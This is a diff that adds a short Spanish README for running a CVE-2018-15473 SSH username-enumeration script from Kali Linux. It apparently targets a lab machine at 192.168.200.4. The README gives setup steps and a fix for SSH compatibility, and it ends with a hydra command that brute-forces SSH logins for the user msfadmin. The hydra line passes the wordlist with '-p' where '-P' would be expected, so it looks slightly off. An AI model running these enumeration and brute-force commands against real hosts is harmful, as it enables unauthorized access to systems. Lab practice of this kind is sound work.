@@ -1,0 +1,26 @@
+-La imagen de kali Linux es con la que a mi me funciono todo perfectamente.
+
+Dentro de la caprta del proyecto:
+
+1. python3 -m venv venv
+2. source venv/bin/activate
+3. pip install -r requirements.txt
+4. pip list
+5. paramiko 2.7.2 -- cryptography 2.8
+
+6. python3 CVE-2018-15473.py 192.168.200.4 -w diccionario.txt
+
+Posibles errores en la imagen de kali Linux:
+-- SSH Wide Compatibility Mode --
+
+Solución:
+1. sudo apt update && sudo apt full-upgrade -y
+2. dpkg -l | grep kali-tweaks
+3. sudo kali-tweaks
+4. Ve a la opción "Hardening".
+4.1 Navega hasta la opción "SSH client" 
+4.2 Selecciona la opción "SSH client"
+4.3 Aplicar cambios
+
+5. sudo systemctl restart ssh
+6. hydra 192.168.200.4 ssh -l msfadmin -p diccionario.txt
